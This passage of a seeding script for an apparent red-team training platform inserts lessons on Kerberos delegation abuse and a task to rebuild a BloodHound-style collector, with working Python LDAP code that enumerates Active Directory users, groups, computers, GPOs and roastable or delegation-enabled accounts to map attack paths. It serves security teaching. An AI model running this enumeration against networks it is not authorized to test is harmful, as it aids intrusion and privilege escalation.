   - Can impersonate users to specified SPNs

2. **Resource-Based Constrained Delegation (RBCD)**
   - Attacker controls a computer account
   - Attacker can modify target's msDS-AllowedToActOnBehalfOfOtherIdentity
   - Can impersonate users to the target

3. **Protocol Transition**
   - Service has TRUSTED_TO_AUTH_FOR_DELEGATION
   - Can use S4U2Self without user involvement
`, 0, now);

// ============================================================================
// BLOODHOUND / SHARPHOUND
// ============================================================================
const bloodhoundPath = insertPath.run(
	'Reimplement: BloodHound Collector',
	'Build an Active Directory enumeration tool like SharpHound. Collect users, groups, sessions, ACLs, and trusts for attack path analysis.',
	'red',
	'C#+Python',
	'advanced',
	10,
	'Active Directory, LDAP, SMB, ACLs, attack paths, graph analysis',
	now
);

const bhMod1 = insertModule.run(bloodhoundPath.lastInsertRowid, 'AD Data Collection', 'Enumerate AD objects and relationships', 0, now);

insertTask.run(bhMod1.lastInsertRowid, 'Build LDAP Enumerator', 'Query Active Directory via LDAP to enumerate users, groups, computers, OUs, GPOs, trusts, and ACLs, collecting the data needed to map attack paths and identify privilege escalation opportunities', `## AD LDAP Enumeration

### Overview
Enumerate Active Directory objects via LDAP for BloodHound ingestion.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
BloodHound-style AD Collector
Enumerate AD for attack path analysis
"""

import ldap3
import json
from datetime import datetime
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor


@dataclass
class ADUser:
    object_id: str
    name: str
    sam_account_name: str
    distinguished_name: str
    domain: str
    enabled: bool
    last_logon: Optional[int]
    pwd_last_set: Optional[int]
    service_principal_names: List[str]
    has_spn: bool
    admin_count: bool
    is_sensitive: bool
    dont_req_preauth: bool
    trusted_to_auth: bool
    group_memberships: List[str]


@dataclass
class ADGroup:
    object_id: str
    name: str
    sam_account_name: str
    distinguished_name: str
    domain: str
    members: List[str]
    admin_count: bool
    is_high_value: bool


@dataclass
class ADComputer:
    object_id: str
    name: str
    sam_account_name: str
    distinguished_name: str
    domain: str
    operating_system: str
    enabled: bool
    unconstraineddelegation: bool
    allowedtodelegate: List[str]
    trustedtoauth: bool


@dataclass
class ADOU:
    object_id: str
    name: str
    distinguished_name: str
    domain: str
    gpo_links: List[str]


class BloodHoundCollector:
    """Collect AD data for BloodHound"""

    def __init__(self, domain: str, dc_ip: str, username: str, password: str):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.conn = None
        self.base_dn = ','.join([f"DC={x}" for x in domain.split('.')])

    def connect(self):
        """Establish LDAP connection"""

        server = ldap3.Server(
            self.dc_ip,
            port=389,
            get_info=ldap3.ALL
        )

        self.conn = ldap3.Connection(
            server,
            user=f"{self.domain}\\\\{self.username}",
            password=self.password,
            authentication=ldap3.NTLM
        )

        if not self.conn.bind():
            raise Exception(f"LDAP bind failed: {self.conn.result}")

        print(f"[+] Connected to {self.dc_ip}")

    def collect_users(self) -> List[ADUser]:
        """Collect all user objects"""

        print("[*] Collecting users...")

        attributes = [
            'objectSid', 'sAMAccountName', 'distinguishedName',
            'userAccountControl', 'lastLogon', 'pwdLastSet',
            'servicePrincipalName', 'adminCount', 'memberOf',
            'msDS-AllowedToDelegateTo', 'cn'
        ]

        self.conn.search(
            self.base_dn,
            '(&(objectClass=user)(!(objectClass=computer)))',
            attributes=attributes
        )

        users = []
        for entry in self.conn.entries:
            try:
                uac = int(entry.userAccountControl.value or 0)

                user = ADUser(
                    object_id=self._sid_to_string(entry.objectSid.raw_values[0]) if entry.objectSid else '',
                    name=str(entry.cn),
                    sam_account_name=str(entry.sAMAccountName),
                    distinguished_name=str(entry.distinguishedName),
                    domain=self.domain.upper(),
                    enabled=not bool(uac & 0x2),  # ACCOUNTDISABLE
                    last_logon=int(entry.lastLogon.value or 0) if entry.lastLogon else 0,
                    pwd_last_set=int(entry.pwdLastSet.value or 0) if entry.pwdLastSet else 0,
                    service_principal_names=list(entry.servicePrincipalName) if entry.servicePrincipalName else [],
                    has_spn=bool(entry.servicePrincipalName),
                    admin_count=bool(entry.adminCount.value) if entry.adminCount else False,
                    is_sensitive=bool(uac & 0x100000),  # NOT_DELEGATED
                    dont_req_preauth=bool(uac & 0x400000),  # DONT_REQ_PREAUTH
                    trusted_to_auth=bool(uac & 0x1000000),  # TRUSTED_TO_AUTH
                    group_memberships=list(entry.memberOf) if entry.memberOf else []
                )
                users.append(user)
            except Exception as e:
                continue

        print(f"[+] Collected {len(users)} users")
        return users

    def collect_groups(self) -> List[ADGroup]:
        """Collect all group objects"""

        print("[*] Collecting groups...")

        attributes = [
            'objectSid', 'sAMAccountName', 'distinguishedName',
            'member', 'adminCount', 'cn'
        ]

        self.conn.search(
            self.base_dn,
            '(objectClass=group)',
            attributes=attributes
        )

        # High-value groups
        high_value_sids = [
            '-512',   # Domain Admins
            '-519',   # Enterprise Admins
            '-544',   # Administrators
            '-548',   # Account Operators
            '-551',   # Backup Operators
            '-518',   # Schema Admins
        ]

        groups = []
        for entry in self.conn.entries:
            try:
                sid = self._sid_to_string(entry.objectSid.raw_values[0]) if entry.objectSid else ''

                group = ADGroup(
                    object_id=sid,
                    name=str(entry.cn),
                    sam_account_name=str(entry.sAMAccountName),
                    distinguished_name=str(entry.distinguishedName),
                    domain=self.domain.upper(),
                    members=list(entry.member) if entry.member else [],
                    admin_count=bool(entry.adminCount.value) if entry.adminCount else False,
                    is_high_value=any(sid.endswith(hv) for hv in high_value_sids)
                )
                groups.append(group)
            except Exception as e:
                continue

        print(f"[+] Collected {len(groups)} groups")
        return groups

    def collect_computers(self) -> List[ADComputer]:
        """Collect all computer objects"""

        print("[*] Collecting computers...")

        attributes = [
            'objectSid', 'sAMAccountName', 'distinguishedName',
            'operatingSystem', 'userAccountControl',
            'msDS-AllowedToDelegateTo', 'cn'
        ]

        self.conn.search(
            self.base_dn,
            '(objectClass=computer)',
            attributes=attributes
        )

        computers = []
        for entry in self.conn.entries:
            try:
                uac = int(entry.userAccountControl.value or 0)

                computer = ADComputer(
                    object_id=self._sid_to_string(entry.objectSid.raw_values[0]) if entry.objectSid else '',
                    name=str(entry.cn),
                    sam_account_name=str(entry.sAMAccountName),
                    distinguished_name=str(entry.distinguishedName),
                    domain=self.domain.upper(),
                    operating_system=str(entry.operatingSystem) if entry.operatingSystem else '',
                    enabled=not bool(uac & 0x2),
                    unconstraineddelegation=bool(uac & 0x80000),  # TRUSTED_FOR_DELEGATION
                    allowedtodelegate=list(entry['msDS-AllowedToDelegateTo']) if entry['msDS-AllowedToDelegateTo'] else [],
                    trustedtoauth=bool(uac & 0x1000000)
                )
                computers.append(computer)
            except Exception as e:
                continue

        print(f"[+] Collected {len(computers)} computers")
        return computers

    def collect_gpos(self) -> List[Dict]:
        """Collect Group Policy Objects"""

        print("[*] Collecting GPOs...")

        self.conn.search(
            self.base_dn,
            '(objectClass=groupPolicyContainer)',
            attributes=['objectGUID', 'displayName', 'gPCFileSysPath']
        )

        gpos = []
        for entry in self.conn.entries:
            gpos.append({
                'object_id': str(entry.objectGUID),
                'name': str(entry.displayName) if entry.displayName else '',
                'path': str(entry.gPCFileSysPath) if entry.gPCFileSysPath else ''
            })

        print(f"[+] Collected {len(gpos)} GPOs")
        return gpos

    def collect_acls(self, dn: str) -> List[Dict]:
        """Collect ACLs for an object"""

        self.conn.search(
            dn,
            '(objectClass=*)',
            attributes=['nTSecurityDescriptor'],
            controls=[('1.2.840.113556.1.4.801', True, b'\\x30\\x03\\x02\\x01\\x07')]
        )

        if not self.conn.entries:
            return []

        # Parse security descriptor
        sd_bytes = self.conn.entries[0].nTSecurityDescriptor.raw_values[0]
        return self._parse_security_descriptor(sd_bytes)

    def _parse_security_descriptor(self, sd_bytes: bytes) -> List[Dict]:
        """Parse Windows Security Descriptor"""

        # Simplified - real implementation uses impacket.ldap.ldaptypes
        aces = []

        # Parse DACL
        # ...

        return aces

    def _sid_to_string(self, sid_bytes: bytes) -> str:
        """Convert binary SID to string format"""

        if not sid_bytes:
            return ''

        revision = sid_bytes[0]
        sub_auth_count = sid_bytes[1]
        authority = int.from_bytes(sid_bytes[2:8], 'big')

        sub_auths = []
        for i in range(sub_auth_count):
            offset = 8 + i * 4
            sub_auth = int.from_bytes(sid_bytes[offset:offset+4], 'little')
            sub_auths.append(str(sub_auth))

        return f"S-{revision}-{authority}-{'-'.join(sub_auths)}"

    def export_bloodhound(self, output_dir: str):
        """Export data in BloodHound JSON format"""

        users = self.collect_users()
        groups = self.collect_groups()
        computers = self.collect_computers()
        gpos = self.collect_gpos()

        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')

        # Users
        users_data = {
            'data': [asdict(u) for u in users],
            'meta': {
                'type': 'users',
                'count': len(users),
                'version': 5
            }
        }
        with open(f"{output_dir}/{timestamp}_users.json", 'w') as f:
            json.dump(users_data, f)

        # Groups
        groups_data = {
            'data': [asdict(g) for g in groups],
            'meta': {
                'type': 'groups',
                'count': len(groups),
                'version': 5
            }
        }
        with open(f"{output_dir}/{timestamp}_groups.json", 'w') as f:
            json.dump(groups_data, f)

        # Computers
        computers_data = {
            'data': [asdict(c) for c in computers],
            'meta': {
                'type': 'computers',
                'count': len(computers),
                'version': 5
            }
        }
        with open(f"{output_dir}/{timestamp}_computers.json", 'w') as f:
            json.dump(computers_data, f)

        print(f"[+] Exported data to {output_dir}/")


def main():
    import argparse

    parser = argparse.ArgumentParser(description='BloodHound Collector')
    parser.add_argument('-d', '--domain', required=True)
    parser.add_argument('-dc', '--dc-ip', required=True)
    parser.add_argument('-u', '--username', required=True)
    parser.add_argument('-p', '--password', required=True)
    parser.add_argument('-o', '--output', default='.', help='Output directory')
    parser.add_argument('-c', '--collection', default='all',
                        choices=['all', 'users', 'groups', 'computers', 'acl', 'sessions'])

    args = parser.parse_args()

    collector = BloodHoundCollector(
        args.domain, args.dc_ip,
        args.username, args.password
    )

    collector.connect()
    collector.export_bloodhound(args.output)


if __name__ == '__main__':
    main()
\`\`\`

### Collection Methods
1. **LDAP** - Users, groups, computers, OUs, GPOs
2. **SMB** - Sessions, local admins
3. **RPC** - Trust relationships
4. **ACL** - Object permissions
`, 0, now);

console.log('Seeded: Rubeus & BloodHound');
console.log('  - AS-REP Roasting');
console.log('  - Kerberoasting');
console.log('  - Pass-the-Ticket');
console.log('  - S4U Delegation');
console.log('  - BloodHound Collector');
